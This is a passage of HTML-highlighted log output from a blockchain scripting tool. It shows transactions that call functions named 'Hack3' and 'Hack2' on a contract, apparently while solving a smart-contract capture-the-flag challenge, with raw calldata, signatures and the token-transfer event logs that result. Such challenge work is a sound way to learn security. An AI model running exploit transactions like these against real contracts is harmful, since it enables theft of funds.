</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>Hack3</span><span class=p>(</span><span class=mi>27</span><span class=p>,</span> <span class=s1>&#39;0xa5d1286d7def3b77cbb220472a211071c46324181555c0e2dcbf4f48acc0ff97&#39;</span><span class=p>,</span> <span class=s1>&#39;0x5c513c2deadaca6d4f1931e49613e780200040b1e89d661b6ff47312bf344ab3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>32.111</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>328</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;1.2 Gwei&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>394418</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0xe4db78d7000000000000000000000000000000000000000000000000000000000000001ba5d1286d7def3b77cbb220472a211071c46324181555c0e2dcbf4f48acc0ff975c513c2deadaca6d4f1931e49613e780200040b1e89d661b6ff47312bf344ab3&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>37.352</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>336</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>106741</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>From</span><span class=p>]</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>To</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>277174</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Data</span><span class=p>]</span><span class=mh>0xe4db78d7000000000000000000000000000000000000000000000000000000000000001ba5d1286d7def3b77cbb220472a211071c46324181555c0e2dcbf4f48acc0ff975c513c2deadaca6d4f1931e49613e780200040b1e89d661b6ff47312bf344ab3</span>  
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][</span><span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeab3a2bb824b124a8a1eb465eec003338d61b414db132d37e9b3a984fdcf010&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106741</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeeda48f51738b80200a0964a98d5ed9a2dc67b52ab5d840ce7103b4867f0b99&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeab3a2bb824b124a8a1eb465eec003338d61b414db132d37e9b3a984fdcf010&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000ff25facbe77eac4ed3603188cccb9431f1a26448&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000003&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106741</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeeda48f51738b80200a0964a98d5ed9a2dc67b52ab5d840ce7103b4867f0b99&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeab3a2bb824b124a8a1eb465eec003338d61b414db132d37e9b3a984fdcf010&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106741</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeeda48f51738b80200a0964a98d5ed9a2dc67b52ab5d840ce7103b4867f0b99&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106741</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeeda48f51738b80200a0964a98d5ed9a2dc67b52ab5d840ce7103b4867f0b99&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000003&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106741</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeeda48f51738b80200a0964a98d5ed9a2dc67b52ab5d840ce7103b4867f0b99&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000ff25facbe77eac4ed3603188cccb9431f1a26448&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000003&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106741</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x55dddd7bedb3645edd116f0a52f3a8c4dec2461eb558d5183c989b47b81226b4&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeeda48f51738b80200a0964a98d5ed9a2dc67b52ab5d840ce7103b4867f0b99&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>5</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>})]</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>37.561</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>CallFunction</span><span class=p>:</span><span class=mi>501</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>CallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>Hack2</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>37.860</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>328</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;1.2 Gwei&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>383959</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0x5ac174d0&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>43.324</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>336</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>106743</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>From</span><span class=p>]</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>To</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>191895</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Data</span><span class=p>]</span><span class=mh>0x5ac174d0</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][</span><span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xbeab3a2bb824b124a8a1eb465eec003338d61b414db132d37e9b3a984fdcf010&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106743</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class=p>),</span> <span 